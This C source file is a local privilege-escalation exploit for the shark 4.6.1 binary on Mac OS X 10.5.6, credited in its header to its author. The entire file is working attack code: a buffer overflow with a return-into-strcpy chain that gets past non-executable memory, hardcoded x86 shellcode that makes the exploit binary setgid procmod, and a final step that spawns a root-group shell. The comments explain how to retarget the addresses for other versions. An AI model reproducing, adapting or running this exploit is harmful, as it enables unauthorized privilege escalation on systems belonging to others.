/* guppy.c - local /usr/bin/shark procmod exploit
** by esdee@promisc.org
**
** Tested on Mac OS X 10.5.6 - Xcode 3.1.2 - shark 4.6.1

** This exploit will return into strcpy() of libc in order to bypass the non-executable pages.
** It will copy the shellcode to a RWX page. (can be found by using the vmmap tool). The shellcode
** will set the exploit binary sgid procmod.
**
** In order to get this working on other versions you will need to change
** the following defines:
**
** ADDRESS_NULL		- ptr to NULL, needed to avoid an early crash in strsep()
** ADDRESS_STRCPY	- address of strcpy() in libc
** ADDRESS_RWX_PAGE	- address of writable and executable page.
** ADDRESS_COPY_SRC	- address of shellcode
**
** -eSDee
*/

#define BUF_SIZE		4096
#define OVERWRITE_OFFSET 	1111
#define PROCMOD_GID		9
#define EXEC_SELF		"_guppy_"
#define SHARK_PATH		"/usr/bin/shark"

#define ADDRESS_NULL		0xbffffffc
#define ADDRESS_STRCPY		0x9209a790
#define ADDRESS_RWX_PAGE	0x4b1b4001
#define ADDRESS_COPY_SRC	0xbfffe0f4

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char 
x86_osx_chmod_shellcode[] = {

	/* x86 OS X setgid/getuid/chown/chmod shellcode */

	0x31, 0xc0, 0x31, 0xdb,	0xb3,	

	PROCMOD_GID,	

	0x53, 0xb0, 0xb5, 0x50,	0xcd, 
	0x80, 0x31, 0xc0, 0xb0, 0x18,
	0x50, 0xcd, 0x80, 0x89,	0xc3, 
	0x50, 0xd8, 0x34, 0x24, 0xd9, 
	0x34, 0x24, 0x8b, 0x54, 0x24, 
	0x0c, 0x80, 0xc2, 0x2c, 0x31,	
	0xc0, 0x31, 0xc9, 0xb1,

	PROCMOD_GID, 

	0x51, 0x53, 0x52, 0xb0, 0x10, 
	0x50, 0xcd, 0x80, 0x31, 0xc0, 
	0x66, 0x68, 0xed, 0x05, 0x52,
	0xb0, 0x0f, 0x50, 0xcd,	0x80, 
	0x31, 0xc0, 0x40, 0xcd, 0x80 
};

void
banner(void)
{
	fprintf(stdout, "[!] shark 4.6.1 exploit - gid procmod (esdee@promisc.org)\r\n\r\n");
	return;
}

void
execute_shark(char *arg, char *env)
{
	char *argv[] = { SHARK_PATH, arg, NULL };
	char *envp[] = { env, NULL };

	fprintf(stdout, "[!] Executing %s ... \r\n\r\n", SHARK_PATH);

	switch(fork()) {
		case 0:
			execve(argv[0], argv, envp);
			_exit(EXIT_FAILURE);
		case -1:
			perror("vfork");
			_exit(EXIT_FAILURE);
		default:
			break;
		
	}
	
	wait(NULL);

	return;
}

void
execute_myself(char *arg)
{
	char *argv[] = { arg, EXEC_SELF };

	execve(argv[0], argv, NULL);
	_exit(EXIT_FAILURE);
}

void
check_setgid()
{
	char *argv[] = { "/bin/sh", NULL };

	if (setgid(PROCMOD_GID) == 0) {
		fprintf(stdout, "\r\n[!] Successful! Spawning shell ... \r\n\r\n"); 
		execve(argv[0], argv, NULL);
		_exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[!] Exploit failed.\r\n");
		
	return;
}

char *
build_env(char *path)
{
        char *ptr = (char *)calloc(BUF_SIZE + 1, sizeof(char));
        
        if (!ptr) {
                fprintf(stderr, "malloc: Out of memory.\r\n");
                exit(EXIT_FAILURE);
        }

	if (strlen(path) > 1024) {
		fprintf(stderr, "[!] Path is too long!\r\n");
		exit(EXIT_FAILURE);
	}

	memset(ptr, 0x90, BUF_SIZE);

	memcpy(	ptr + BUF_SIZE - sizeof(x86_osx_chmod_shellcode) - strlen(path), 
		&x86_osx_chmod_shellcode, 
		sizeof(x86_osx_chmod_shellcode));

	strcpy(ptr + BUF_SIZE - strlen(path), path); // should fit

	return ptr;
}

char *
build_buffer(u_int32_t address_null, u_int32_t address_strcpy, u_int32_t address_strcpy_dst, u_int32_t address_strcpy_src)
{
	char *ptr = (char *)calloc(BUF_SIZE + 1, sizeof(char));
	char *ret = ptr;

	if (!ret) {
		fprintf(stderr, "malloc: Out of memory.\r\n");	
		exit(EXIT_FAILURE);
	}

	memset(ret, 'b', BUF_SIZE);
	ptr += OVERWRITE_OFFSET;

	memcpy(ptr, &address_null, sizeof(u_int32_t));			// pointer to NULL
	ptr += 32;	

	memcpy(ptr, &address_strcpy, sizeof(u_int32_t));		// pointer to strcpy in libc
	ptr += 4;
	
	memcpy(ptr, &address_strcpy_dst, sizeof(u_int32_t));		// return address for strcpy
	ptr += 4;

	memcpy(ptr, &address_strcpy_dst, sizeof(u_int32_t));		// dst for strcpy
	ptr += 4;

	memcpy(ptr, &address_strcpy_src, sizeof(u_int32_t));		// src for strcpy
	ptr += 2048;

	*ptr = '\0';

        fprintf(stdout, " -  address NULL     : 0x%08x\r\n"
                        " -  address strcpy() : 0x%08x\r\n"
                        " -  strcpy() src     : 0x%08x\r\n"
                        " -  strcpy() dst     : 0x%08x\r\n\r\n",
                        address_null, address_strcpy, address_strcpy_src, address_strcpy_dst);	
	return ret;
}

int
main(int argc, char *argv[])
{
	char *arg_buf = NULL;
	char *env_buf = NULL;

	if (argc > 1) {
	        if (!strncmp(argv[1], EXEC_SELF, strlen(EXEC_SELF))) {
			check_setgid();        	
                	exit(EXIT_FAILURE);
        	}
	}
		
	banner();

	env_buf = build_env	(argv[0] == NULL ? "" : argv[0]);

	arg_buf = build_buffer	(	ADDRESS_NULL,
					ADDRESS_STRCPY,
					ADDRESS_RWX_PAGE,
					ADDRESS_COPY_SRC);

	execute_shark	(arg_buf, env_buf);
	execute_myself	(argv[0] == NULL ? "" : argv[0]);

	return 0;
}
